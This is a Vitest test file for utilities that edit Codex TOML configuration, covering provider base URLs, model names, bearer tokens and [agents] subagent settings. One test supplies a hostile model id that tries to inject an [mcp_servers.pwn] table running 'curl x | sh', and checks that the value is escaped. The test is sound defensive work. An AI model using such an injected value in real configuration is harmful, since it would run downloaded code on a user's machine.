import { describe, expect, it } from "vitest";
import { parse as parseToml } from "smol-toml";
import {
  extractCodexAgentsMaxThreads,
  extractCodexAgentsString,
  extractCodexBaseUrl,
  extractCodexExperimentalBearerToken,
  extractCodexModelName,
  extractCodexMultiAgentV2Total,
  hasExplicitNonOpenAiCodexModelProvider,
  setCodexAgentsMaxThreads,
  setCodexAgentsString,
  setCodexBaseUrl,
  setCodexModelName,
} from "@/utils/providerConfigUtils";

describe("Codex TOML utils", () => {
  it("removes base_url line when set to empty", () => {
    const input = [
      'model_provider = "openai"',
      'base_url = "https://api.example.com/v1"',
      'model = "gpt-5-codex"',
      "",
    ].join("\n");

    const output = setCodexBaseUrl(input, "");

    expect(output).not.toMatch(/^\s*base_url\s*=/m);
    expect(extractCodexBaseUrl(output)).toBeUndefined();
    expect(extractCodexModelName(output)).toBe("gpt-5-codex");
  });

  it("removes only the top-level model line when set to empty", () => {
    const input = [
      'model_provider = "openai"',
      'base_url = "https://api.example.com/v1"',
      'model = "gpt-5-codex"',
      "",
      "[profiles.default]",
      'model = "profile-model"',
      "",
    ].join("\n");

    const output = setCodexModelName(input, "");

    expect(output).not.toMatch(/^model\s*=\s*"gpt-5-codex"$/m);
    expect(output).toMatch(/^\[profiles\.default\]\nmodel = "profile-model"$/m);
    expect(extractCodexModelName(output)).toBeUndefined();
    expect(extractCodexBaseUrl(output)).toBe("https://api.example.com/v1");
  });

  it("updates existing values when non-empty", () => {
    const input = [
      'model_provider = "openai"',
      "base_url = 'https://old.example/v1'",
      'model = "old-model"',
      "",
    ].join("\n");

    const output1 = setCodexBaseUrl(input, " https://new.example/v1 \n");
    expect(extractCodexBaseUrl(output1)).toBe("https://new.example/v1");

    const output2 = setCodexModelName(output1, " new-model \n");
    expect(extractCodexModelName(output2)).toBe("new-model");
  });

  it("reads and writes base_url in the active provider section", () => {
    const input = [
      'model_provider = "custom"',
      'model = "gpt-5.4"',
      "",
      "[model_providers.custom]",
      'name = "custom"',
      'wire_api = "responses"',
      "",
      "[profiles.default]",
      'approval_policy = "never"',
      "",
    ].join("\n");

    const output = setCodexBaseUrl(input, "https://api.example.com/v1");

    expect(output).toContain(
      '[model_providers.custom]\nname = "custom"\nwire_api = "responses"\nbase_url = "https://api.example.com/v1"',
    );
    expect(extractCodexBaseUrl(output)).toBe("https://api.example.com/v1");
  });

  it("recovers a single misplaced base_url from another section", () => {
    const input = [
      'model_provider = "custom"',
      'model = "gpt-5.4"',
      "",
      "[model_providers.custom]",
      'name = "custom"',
      'wire_api = "responses"',
      "",
      "[profiles.default]",
      'approval_policy = "never"',
      'base_url = "https://wrong.example/v1"',
      "",
    ].join("\n");

    expect(extractCodexBaseUrl(input)).toBe("https://wrong.example/v1");

    const output = setCodexBaseUrl(input, "https://fixed.example/v1");

    expect(output).toContain(
      '[model_providers.custom]\nname = "custom"\nwire_api = "responses"\nbase_url = "https://fixed.example/v1"',
    );
    expect(output).not.toContain("https://wrong.example/v1");
    expect(output.match(/base_url\s*=/g)).toHaveLength(1);
  });

  it("does not treat mcp_servers base_url as provider base_url", () => {
    const input = [
      'model_provider = "azure"',
      'model = "gpt-4"',
      "",
      "[model_providers.azure]",
      'name = "Azure OpenAI"',
      'wire_api = "responses"',
      "",
      "[mcp_servers.my_server]",
      'base_url = "http://localhost:8080"',
      "",
    ].join("\n");

    expect(extractCodexBaseUrl(input)).toBeUndefined();

    const output = setCodexBaseUrl(input, "https://new.azure/v1");

    expect(output).toContain(
      '[model_providers.azure]\nname = "Azure OpenAI"\nwire_api = "responses"\nbase_url = "https://new.azure/v1"',
    );
    expect(output).toContain(
      '[mcp_servers.my_server]\nbase_url = "http://localhost:8080"',
    );
  });

  it("writes base_url into a selected custom table when there is no model_provider", () => {
    const output = setCodexBaseUrl(
      'model = "gpt-5.4"\n',
      "https://relay.example/v1",
    );

    expect(output).toBe(
      [
        'model_provider = "custom"',
        'model = "gpt-5.4"',
        "",
        "[model_providers.custom]",
        'name = "custom"',
        'wire_api = "responses"',
        'base_url = "https://relay.example/v1"',
      ].join("\n"),
    );
    expect(extractCodexBaseUrl(output)).toBe("https://relay.example/v1");
  });

  it("moves a legacy top-level base_url and wire_api into the custom table", () => {
    const input = [
      'base_url = "https://old.example/v1"',
      'model = "gpt-5.4"',
      'wire_api = "chat"',
      "",
      "[mcp_servers.fs]",
      'base_url = "http://localhost:8080"',
      "",
    ].join("\n");

    const output = setCodexBaseUrl(input, "https://new.example/v1");

    expect(output).toMatch(/^model_provider = "custom"\nmodel = "gpt-5.4"\n/);
    expect(output).toContain(
      '[model_providers.custom]\nname = "custom"\nwire_api = "chat"\nbase_url = "https://new.example/v1"',
    );
    expect(output).toContain(
      '[mcp_servers.fs]\nbase_url = "http://localhost:8080"',
    );
    expect(output).not.toContain("old.example");
    expect(output.match(/^wire_api\s*=/gm)).toHaveLength(1);
    expect(extractCodexBaseUrl(output)).toBe("https://new.example/v1");
  });

  it("selects an existing custom table instead of adding another one", () => {
    const input = [
      'model = "gpt-5.4"',
      "",
      "[model_providers.custom]",
      'name = "custom"',
      'wire_api = "responses"',
      "",
    ].join("\n");

    const output = setCodexBaseUrl(input, "https://relay.example/v1");

    expect(output.match(/^\[model_providers\.custom\]$/gm)).toHaveLength(1);
    expect(output).toMatch(/^model_provider = "custom"$/m);
    expect(extractCodexBaseUrl(output)).toBe("https://relay.example/v1");
  });

  it("finds the active provider table when its header quotes the key", () => {
    for (const header of [
      '[model_providers."custom"]',
      "[model_providers.'custom']",
      "[ model_providers . custom ]",
      '["model_providers".custom]',
      "[model_providers.custom] # relay",
    ]) {
      const input = [
        'model_provider = "custom"',
        "",
        header,
        'name = "custom"',
        'wire_api = "responses"',
        "",
        "[features]",
        "",
      ].join("\n");

      const output = setCodexBaseUrl(input, "https://relay.example/v1");

      const parsed = parseToml(output) as Record<string, any>;
      expect(parsed.model_providers.custom, header).toEqual({
        name: "custom",
        wire_api: "responses",
        base_url: "https://relay.example/v1",
      });
      expect(output.split(/^\s*\[/m), header).toHaveLength(3);
      expect(extractCodexBaseUrl(output), header).toBe(
        "https://relay.example/v1",
      );
      expect(
        extractCodexBaseUrl(setCodexBaseUrl(output, "")),
        header,
      ).toBeUndefined();
    }
  });

  it("writes base_url into a quoted provider table whose id needs quoting", () => {
    const input = [
      'model_provider = "my.relay"',
      "",
      '[model_providers."my.relay"]',
      'name = "my.relay"',
      "",
    ].join("\n");

    const output = setCodexBaseUrl(input, "https://relay.example/v1");

    const parsed = parseToml(output) as Record<string, any>;
    expect(Object.keys(parsed.model_providers)).toEqual(["my.relay"]);
    expect(parsed.model_providers["my.relay"].base_url).toBe(
      "https://relay.example/v1",
    );
  });

  // Web 的表单不往 TOML 里写 bearer token（Key 存在 auth 里），只核对读取
  it("reads the bearer token from a provider table whose header quotes the key", () => {
    const input = [
      'model_provider = "custom"',
      "",
      '[model_providers."custom"]',
      'name = "custom"',
      'experimental_bearer_token = "old"',
      "",
    ].join("\n");

    expect(extractCodexExperimentalBearerToken(input)).toBe("old");
  });

  it("skips provider tables quoted inside a multi-line string", () => {
    for (const delimiter of ['"""', "'''"]) {
      const instructions = [
        "Example:",
        '[model_providers."custom"]',
        'base_url = "https://example.invalid/v1"',
        'experimental_bearer_token = "example-token"',
        "",
      ].join("\n");
      const input = [
        'model_provider = "custom"',
        `developer_instructions = ${delimiter}`,
        `${instructions}${delimiter}`,
        "",
        "[model_providers.custom]",
        'name = "custom"',
        'base_url = "https://old.invalid/v1"',
        'experimental_bearer_token = "old-token"',
        "",
      ].join("\n");

      expect(extractCodexBaseUrl(input), delimiter).toBe(
        "https://old.invalid/v1",
      );
      expect(extractCodexExperimentalBearerToken(input), delimiter).toBe(
        "old-token",
      );

      const output = setCodexBaseUrl(input, "https://new.invalid/v1");

      const parsed = parseToml(output) as Record<string, any>;
      expect(parsed.developer_instructions, delimiter).toBe(instructions);
      expect(parsed.model_providers.custom, delimiter).toEqual({
        name: "custom",
        base_url: "https://new.invalid/v1",
        experimental_bearer_token: "old-token",
      });
    }
  });

  it("never redefines a custom table the line scan cannot see", () => {
    for (const input of [
      'model = "m"\n\n[model_providers.custom] # mine\nname = "custom"\nwire_api = "responses"\n',
      'model = "m"\nmodel_providers = { custom = { name = "custom", wire_api = "responses" } }\n',
      'model = "m"\n\n[model_providers]\ncustom = { name = "custom", wire_api = "responses" }\n',
    ]) {
      const output = setCodexBaseUrl(input, "https://r.example/v1");
      const parsed = parseToml(output) as Record<string, any>;
      expect(parsed.model_providers.custom.wire_api, input).toBe("responses");
      expect(extractCodexBaseUrl(output), input).toBe("https://r.example/v1");
    }
  });

  it("keeps assignment-like lines inside a multi-line string", () => {
    const instructions =
      'line one\nmodel_provider = example\nwire_api = "chat"\n';
    const input = `model = "m"\nbase_instructions = """\n${instructions}"""\n`;

    const output = setCodexBaseUrl(input, "https://r.example/v1");

    const parsed = parseToml(output) as Record<string, any>;
    expect(parsed.base_instructions).toBe(instructions);
    expect(parsed.base_url).toBe("https://r.example/v1");
  });

  it("reads model only from the top-level config", () => {
    const input = [
      'model_provider = "custom"',
      "",
      "[profiles.default]",
      'model = "profile-model"',
      "",
    ].join("\n");

    expect(extractCodexModelName(input)).toBeUndefined();
  });

  it("handles single-quoted values", () => {
    const input = "base_url = 'https://api.example.com/v1'\nmodel = 'gpt-5'\n";

    expect(extractCodexBaseUrl(input)).toBe("https://api.example.com/v1");
    expect(extractCodexModelName(input)).toBe("gpt-5");
  });

  it("escapes hostile model ids instead of injecting TOML lines", () => {
    const input = 'model_provider = "custom"\nmodel = "gpt-5"\n';
    const hostile = 'evil"\n[mcp_servers.pwn]\ncommand = "curl x | sh';
    const output = setCodexModelName(input, hostile);

    expect(output).not.toMatch(/^\[mcp_servers\.pwn\]$/m);
    expect(output).not.toMatch(/^command = /m);
    expect(output).toContain(
      'model = "evil\\"\\n[mcp_servers.pwn]\\ncommand = \\"curl x | sh"',
    );
    expect(
      output.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
  });

  it("round-trips quotes, backslashes and control characters", () => {
    const name = 'vendor\\a"b\tmodel';
    const output = setCodexModelName("", name);

    expect(output).toContain('model = "vendor\\\\a\\"b\\tmodel"');
    expect(extractCodexModelName(output)).toBe(name);
  });

  it("replaces escaped and empty model values without duplicating lines", () => {
    const escaped = setCodexModelName('model = "old"\n', 'evil"name');
    const replaced = setCodexModelName(escaped, "gpt-5.6");

    expect(extractCodexModelName('model = ""\n')).toBe("");
    expect(extractCodexModelName("model = 'kimi-k2.7'\n")).toBe("kimi-k2.7");
    expect(
      replaced.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(replaced)).toBe("gpt-5.6");
  });
});

describe("Codex reserved provider ids", () => {
  it("treats amazon-bedrock-runtime as reserved, matching the backend list", () => {
    // Codex 0.149 保留该 id；后端不会往其表内写 bearer token，前端也不从中读取。
    const input = `model_provider = "amazon-bedrock-runtime"
experimental_bearer_token = "top-level-key"

[model_providers.amazon-bedrock-runtime]
experimental_bearer_token = "stale-table-key"
`;

    expect(extractCodexExperimentalBearerToken(input)).toBe("top-level-key");
  });

  it("matches the built-in openai id case-sensitively", () => {
    expect(
      hasExplicitNonOpenAiCodexModelProvider('model_provider = "openai"'),
    ).toBe(false);
    expect(
      hasExplicitNonOpenAiCodexModelProvider('model_provider = "OpenAI"'),
    ).toBe(true);
  });
});

describe("Codex [agents] subagent defaults", () => {
  const base = [
    'model_provider = "custom"',
    'model = "gpt-a"',
    "",
    "[model_providers.custom]",
    'base_url = "https://a.example/v1"',
  ].join("\n");

  it("adds an [agents] table and removes it again when cleared", () => {
    const withModel = setCodexAgentsString(
      base,
      "default_subagent_model",
      "gpt-a-mini",
    );
    expect(parseToml(withModel)).toMatchObject({
      model: "gpt-a",
      agents: { default_subagent_model: "gpt-a-mini" },
    });

    const withEffort = setCodexAgentsString(
      withModel,
      "default_subagent_reasoning_effort",
      "low",
    );
    expect(
      extractCodexAgentsString(withEffort, "default_subagent_reasoning_effort"),
    ).toBe("low");

    const cleared = setCodexAgentsString(
      setCodexAgentsString(withEffort, "default_subagent_model", ""),
      "default_subagent_reasoning_effort",
      "",
    );
    expect(cleared.trim()).toBe(base);
  });

  it("edits only its key inside an existing [agents] table", () => {
    const input = [
      base,
      "",
      "[agents]",
      "max_threads = 4",
      'default_subagent_model = "old"',
      "",
      "[agents.reviewer]",
      'description = "review"',
    ].join("\n");

    const updated = setCodexAgentsString(
      input,
      "default_subagent_model",
      'k3"mini',
    );
    const parsed = parseToml(updated) as any;
    expect(parsed.agents.default_subagent_model).toBe('k3"mini');
    expect(parsed.agents.max_threads).toBe(4);
    expect(parsed.agents.reviewer.description).toBe("review");
    expect(extractCodexAgentsString(updated, "default_subagent_model")).toBe(
      'k3"mini',
    );

    const cleared = setCodexAgentsString(updated, "default_subagent_model", "");
    const afterClear = parseToml(cleared) as any;
    expect(afterClear.agents.default_subagent_model).toBeUndefined();
    expect(afterClear.agents.max_threads).toBe(4);
  });

  it("adds [agents] after an existing [agents.<role>] table", () => {
    const input = `${base}\n\n[agents.reviewer]\ndescription = "review"\n`;
    const updated = setCodexAgentsString(input, "default_subagent_model", "m");
    const parsed = parseToml(updated) as any;
    expect(parsed.agents.default_subagent_model).toBe("m");
    expect(parsed.agents.reviewer.description).toBe("review");
  });

  it("replaces a quoted key in place", () => {
    const input = `[agents]\n"default_subagent_model" = "old"\n`;
    const updated = setCodexAgentsString(input, "default_subagent_model", "m");
    expect((parseToml(updated) as any).agents).toEqual({
      default_subagent_model: "m",
    });
    expect(
      extractCodexAgentsString(`${input}broken = [`, "default_subagent_model"),
    ).toBe("old");
  });

  it("leaves an inline agents table untouched instead of breaking the TOML", () => {
    const input = `agents = { max_threads = 4 }\n${base}\n`;
    expect(extractCodexAgentsString(input, "default_subagent_model")).toBe(
      undefined,
    );
    const updated = setCodexAgentsString(input, "default_subagent_model", "m");
    expect(() => parseToml(updated)).not.toThrow();
    expect((parseToml(updated) as any).agents).toEqual({ max_threads: 4 });
  });
});

// 上游 ddcb1117：数组表头 [[...]] 也算表头
describe("setCodexBaseUrl with array-of-tables headers", () => {
  it("writes base_url inside [model_providers.custom] when [[skills.config]] follows", () => {
    // Regression: [[skills.config]] is an array-of-tables header ([[...]])
    // that the section regex did not recognize, so the section range extended
    // past it and base_url was appended after the skills content — landing
    // inside skills.config[0] instead of model_providers.custom.
    const input = `model_provider = "custom"
model = "gpt-5.5"

[model_providers.custom]
name = "custom"
wire_api = "responses"
requires_openai_auth = true

[[skills.config]]
path = "/path/to/some-skill/SKILL.md"
enabled = false
`;

    const result = setCodexBaseUrl(input, "https://relay.example.com/v1");

    // base_url must be inside [model_providers.custom], i.e. before the
    // [[skills.config]] header.
    const baseUrlLine = 'base_url = "https://relay.example.com/v1"';
    const baseUrlIndex = result.indexOf(baseUrlLine);
    const skillsHeaderIndex = result.indexOf("[[skills.config]]");
    expect(baseUrlIndex).toBeGreaterThan(-1);
    expect(skillsHeaderIndex).toBeGreaterThan(-1);
    expect(baseUrlIndex).toBeLessThan(skillsHeaderIndex);

    // Round-trip: extractCodexBaseUrl must find it in the custom table.
    expect(extractCodexBaseUrl(result)).toBe("https://relay.example.com/v1");
  });

  it("writes base_url inside [model_providers.custom] when [[skills.config]] precedes it", () => {
    const input = `model_provider = "custom"
model = "gpt-5.5"

[[skills.config]]
path = "/path/to/some-skill/SKILL.md"
enabled = false

[model_providers.custom]
name = "custom"
wire_api = "responses"
requires_openai_auth = true
`;

    const result = setCodexBaseUrl(input, "https://relay.example.com/v1");

    // base_url must be after [model_providers.custom] and NOT inside the
    // skills.config array that precedes it.
    const baseUrlLine = 'base_url = "https://relay.example.com/v1"';
    const baseUrlIndex = result.indexOf(baseUrlLine);
    const customHeaderIndex = result.indexOf("[model_providers.custom]");
    expect(baseUrlIndex).toBeGreaterThan(customHeaderIndex);

    // The skills.config block must not contain base_url.
    const skillsBlock = result.slice(
      result.indexOf("[[skills.config]]"),
      result.indexOf("[model_providers.custom]"),
    );
    expect(skillsBlock).not.toContain("base_url");

    expect(extractCodexBaseUrl(result)).toBe("https://relay.example.com/v1");
  });

  it("recovers base_url from a corrupted [[skills.config]] entry", () => {
    // v4.0.21 wrote base_url inside [[skills.config]] instead of
    // [model_providers.custom]. When the user edits the URL again,
    // the fix must move it to the custom table and remove the stale
    // entry from skills.config[0].
    const input = `model_provider = "custom"

[model_providers.custom]
name = "custom"
wire_api = "responses"
requires_openai_auth = true

[[skills.config]]
path = "/synthetic/example/SKILL.md"
enabled = false
base_url = "https://old.example/v1"
`;

    const result = setCodexBaseUrl(input, "https://new.example/v1");

    // The new base_url must be in [model_providers.custom].
    expect(extractCodexBaseUrl(result)).toBe("https://new.example/v1");

    // The old URL must be gone entirely.
    expect(result).not.toContain("https://old.example/v1");

    // The skills.config block must not contain base_url.
    const skillsBlock = result.slice(result.indexOf("[[skills.config]]"));
    expect(skillsBlock).not.toContain("base_url");

    // Skill path and enabled flag must be preserved.
    expect(skillsBlock).toContain('path = "/synthetic/example/SKILL.md"');
    expect(skillsBlock).toContain("enabled = false");
  });
});

// 上游 a9e607c3：子代理并发上限
describe("Codex [agents] sub-agent concurrency limit", () => {
  const base = [
    'model = "gpt-a"',
    "",
    "[mcp_servers.fs]",
    'command = "fs"',
  ].join("\n");

  it("writes max_threads into a new [agents] table and removes it when cleared", () => {
    const updated = setCodexAgentsMaxThreads(base, 8);
    expect((parseToml(updated) as any).agents).toEqual({ max_threads: 8 });
    expect(extractCodexAgentsMaxThreads(updated)).toBe(8);

    const cleared = setCodexAgentsMaxThreads(updated, undefined);
    expect(cleared.trim()).toBe(base);
    expect(extractCodexAgentsMaxThreads(cleared)).toBeUndefined();
  });

  it("keeps the canonical name in place and the other [agents] keys", () => {
    const input = [
      "[agents]",
      "max_concurrent_threads_per_session = 2 # mine",
      'default_subagent_model = "m"',
    ].join("\n");
    expect(extractCodexAgentsMaxThreads(input)).toBe(2);

    const updated = setCodexAgentsMaxThreads(input, 12);
    expect(updated).toContain("max_concurrent_threads_per_session = 12");
    expect(updated).not.toContain("max_threads");
    expect((parseToml(updated) as any).agents.default_subagent_model).toBe("m");

    const cleared = setCodexAgentsMaxThreads(updated, undefined);
    expect((parseToml(cleared) as any).agents).toEqual({
      default_subagent_model: "m",
    });
  });

  it("drops the duplicate spelling so Codex does not reject the config", () => {
    const input =
      "[agents]\nmax_threads = 2\nmax_concurrent_threads_per_session = 3\n";
    const updated = setCodexAgentsMaxThreads(input, 5);
    expect((parseToml(updated) as any).agents).toEqual({
      max_concurrent_threads_per_session: 5,
    });
  });

  it("does not mistake the multi_agent_v2 key for the [agents] one", () => {
    const input = [
      "[features.multi_agent_v2]",
      "enabled = true",
      "max_concurrent_threads_per_session = 6",
    ].join("\n");
    expect(extractCodexAgentsMaxThreads(input)).toBeUndefined();
    expect(extractCodexMultiAgentV2Total(input)).toBe(6);

    const parsed = parseToml(setCodexAgentsMaxThreads(input, 4)) as any;
    expect(parsed.agents).toEqual({ max_threads: 4 });
    expect(
      parsed.features.multi_agent_v2.max_concurrent_threads_per_session,
    ).toBe(6);
  });

  it("stops the [agents] table at a header with a trailing comment", () => {
    const input = [
      "[agents]",
      "max_threads = 4",
      "",
      "[features.multi_agent_v2] # tools",
      "max_concurrent_threads_per_session = 6",
    ].join("\n");

    const parsed = parseToml(setCodexAgentsMaxThreads(input, 8)) as any;
    expect(parsed.agents).toEqual({ max_threads: 8 });
    expect(
      parsed.features.multi_agent_v2.max_concurrent_threads_per_session,
    ).toBe(6);
  });

  it("finds an [agents] header that has a trailing comment", () => {
    const input = "[agents] # mine\nmax_threads = 4\n";
    const updated = setCodexAgentsMaxThreads(input, 8);
    expect(updated).toContain("[agents] # mine");
    expect((parseToml(updated) as any).agents).toEqual({ max_threads: 8 });
    expect(
      extractCodexAgentsMaxThreads(
        "[agents] # mine\nmax_threads = 7\nbroken = [",
      ),
    ).toBe(7);
  });

  it("recognizes quoted key spellings instead of adding a second one", () => {
    for (const quoted of [
      '"max_concurrent_threads_per_session"',
      "'max_concurrent_threads_per_session'",
    ]) {
      const input = `[agents]\n${quoted} = 3\n`;
      const updated = setCodexAgentsMaxThreads(input, 8);
      expect((parseToml(updated) as any).agents, quoted).toEqual({
        max_concurrent_threads_per_session: 8,
      });
      expect(extractCodexAgentsMaxThreads(updated), quoted).toBe(8);

      expect(setCodexAgentsMaxThreads(input, undefined), quoted).not.toContain(
        "[agents]",
      );
      expect(extractCodexAgentsMaxThreads(`${input}broken = [`), quoted).toBe(
        3,
      );
    }

    const both =
      '[agents]\n"max_threads" = 2\nmax_concurrent_threads_per_session = 3\n';
    expect(
      (parseToml(setCodexAgentsMaxThreads(both, 5)) as any).agents,
    ).toEqual({ max_concurrent_threads_per_session: 5 });
  });

  it("reads half-edited TOML line by line and ignores 0", () => {
    expect(
      extractCodexAgentsMaxThreads("[agents]\nmax_threads = 7\nbroken = ["),
    ).toBe(7);
    expect(
      extractCodexAgentsMaxThreads("[agents]\nmax_threads = 0\n"),
    ).toBeUndefined();
    expect(extractCodexAgentsMaxThreads("agents = { max_threads = 3 }\n")).toBe(
      3,
    );
  });
});
